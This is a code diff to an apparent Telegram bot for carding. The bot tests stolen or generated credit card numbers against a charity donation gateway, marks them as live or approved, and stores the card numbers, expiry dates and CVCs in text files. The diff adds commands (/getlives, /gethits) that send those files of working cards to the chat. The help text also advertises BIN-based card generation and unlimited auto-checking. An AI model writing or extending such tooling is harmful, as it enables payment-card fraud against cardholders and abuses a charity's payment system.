@@ -381,6 +381,7 @@ def check_card(card_line, chat_id):
         
         elif any(word in result.lower() for word in ["insufficient", "funds", "cvc", "security code", "3d", "authenticate"]):
             # This is a LIVE CC (Not charged but active)
+            safe_reason = result.replace('FAILED: ', '').replace('_', ' ').replace('*', '')[:30]
             msg = (
                 "✅ *LIVE - CC!* ✅\n"
                 "━━━━━━━━━━━━━━━━━━\n"
@@ -389,13 +390,13 @@ def check_card(card_line, chat_id):
                 f"🔑 *CVC:* `{cc_cvc}`\n"
                 "━━━━━━━━━━━━━━━━━━\n"
                 f"ℹ️ *Status:* Live (Not Charged)\n"
-                f"📝 *Reason:* {result.replace('FAILED: ', '')[:30]}\n"
+                f"📝 *Reason:* {safe_reason}\n"
                 "🌍 *Gateway:* Palestine Charity\n"
                 "🤖 *Checked by:* @sbscc_bot\n"
                 "━━━━━━━━━━━━━━━━━━"
             )
             STATS["lives"] += 1
-            add_event(f"LIVE ✅ | {cc_num}|{cc_mon}|{cc_year} | {result.replace('FAILED: ', '')[:20]}", type="live")
+            add_event(f"LIVE ✅ | {cc_num}|{cc_mon}|{cc_year} | {safe_reason[:20]}", type="live")
             send_telegram_msg(chat_id, msg)
             with open("lives.txt", "a") as f:
                 f.write(f"{card_line} | Reason: {result}\n")
@@ -465,6 +466,9 @@ def welcome(message):
         "🔹 `/bin 451101` - Generate 10 Cards from BIN\n"
         "🔹 `/bingen 451101` - Unlimited Auto-Gen & Check\n"
         "🔹 `/amount 5.00` - Set Custom Charge Amount\n"
+        "🔹 `/getlives` - Get file of all Live cards\n"
+        "🔹 `/gethits` - Get file of all Approved hits\n"
+        "🔹 `/health` - Check System Health & Stats\n"
         "🔹 `/stop` - Stop ongoing Processes\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
         "📥 *Other ways to check:*\n"
@@ -499,6 +503,28 @@ def stop_process(message):
         USER_PROCESSES[chat_id]["checking"] = False
         USER_PROCESSES[chat_id]["bingen"] = False
     bot.reply_to(message, "🛑 *Process Stopped Successfully!*", parse_mode="Markdown")
+
+@bot.message_handler(commands=['getlives'])
+def handle_getlives(message):
+    try:
+        if os.path.exists('lives.txt') and os.path.getsize('lives.txt') > 0:
+            with open('lives.txt', 'rb') as f:
+                bot.send_document(message.chat.id, f, caption="✅ All Live Cards")
+        else:
+            bot.reply_to(message, "⚠️ No live cards found yet.")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {e}")
+
+@bot.message_handler(commands=['gethits'])
+def handle_gethits(message):
+    try:
+        if os.path.exists('hits.txt') and os.path.getsize('hits.txt') > 0:
+            with open('hits.txt', 'rb') as f:
+                bot.send_document(message.chat.id, f, caption="🔥 All Approved Cards")
+        else:
+            bot.reply_to(message, "⚠️ No approved hits found yet.")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {e}")
 
 @bot.message_handler(commands=['bin'])
 def handle_bin(message):
